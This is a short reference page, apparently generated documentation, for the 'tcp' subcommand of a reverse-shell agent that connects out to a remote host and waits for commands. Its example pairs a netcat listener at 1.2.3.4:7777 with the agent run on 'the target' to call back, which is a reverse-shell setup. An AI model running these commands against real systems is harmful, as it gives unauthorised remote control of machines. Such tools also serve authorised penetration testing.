## reverse-shell-agent tcp

Agent that connects to a remove tcp endpoints and listen for commands

### Synopsis

Agent that connects to a remove tcp endpoints and listen for commands

```
reverse-shell-agent tcp [flags]
```

### Examples

```
# On the client (1.2.3.4)
$ nc -v -l -p 7777

# On the target
$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777

```

### Options

```
  -h, --help          help for tcp
      --host string   remote host to connect to (default "0.0.0.0")
      --port int32    remote port to connect to (default 8080)
```

### Options inherited from parent commands

```
  -v, --verbose int   Be verbose on log output
```

### SEE ALSO

* [reverse-shell-agent](reverse-shell-agent.md)	 - Agents listening for remote commands

